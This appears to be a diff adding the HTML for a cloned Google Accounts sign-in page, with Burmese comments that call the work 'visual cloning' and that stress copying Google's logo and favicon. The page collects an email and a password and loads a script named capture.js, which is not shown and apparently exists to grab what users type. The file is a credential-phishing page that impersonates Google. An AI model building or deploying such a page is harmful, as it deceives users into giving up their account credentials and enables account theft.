@@ -1,0 +1,66 @@
+<!-- index.html - Generic Sign-in Page Structure -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Google ရဲ့ Favicon ကို ထည့်သွင်းခြင်းက Visual Cloning ရဲ့ အရေးကြီးတဲ့ အစိတ်အပိုင်းပဲ Bro -->
+</head>
+<body>
+    <div class="center-container">
+        <div class="login-card">
+
+            <!-- Logo Section -->
+            <div class="logo-section">
+                <!-- Google logo ကို SVG ဒါမှမဟုတ် PNG နဲ့ ထည့်သွင်းရမယ် -->
+                <img src="google_logo.png" alt="Google" class="google-logo">
+            </div>
+
+            <!-- Title Section -->
+            <div class="title-section">
+                <h1>Sign in</h1>
+                <p class="subtitle">Use your Google Account</p>
+            </div>
+
+            <!-- Form Section -->
+            <form id="loginForm" onsubmit="return false;">
+
+                <!-- Email/Username Input -->
+                <div class="input-group">
+                    <input type="email" id="username" name="username" placeholder="Email or phone" required>
+                </div>
+
+                <!-- Password Input (Simplifying to one page) -->
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+
+                <!-- Forgot Link -->
+                <p class="forgot-link"><a href="#">Forgot email?</a></p>
+
+                <!-- Action Button -->
+                <div class="action-row">
+                    <button type="submit" class="btn-create">Create account</button>
+                    <button type="submit" class="btn-next">Next</button>
+                </div>
+
+            </form>
+        </div>
+
+        <!-- Language Footer -->
+        <div class="footer-language">
+            <select>
+                <option>English (United States)</option>
+                <option>Myanmar (Burmese)</option>
+            </select>
+            <!-- Privacy links တွေကို ဒီနေရာမှာ ထည့်ရမယ် -->
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+  <script src="capture.js"></script>
+</body>
+  </html>
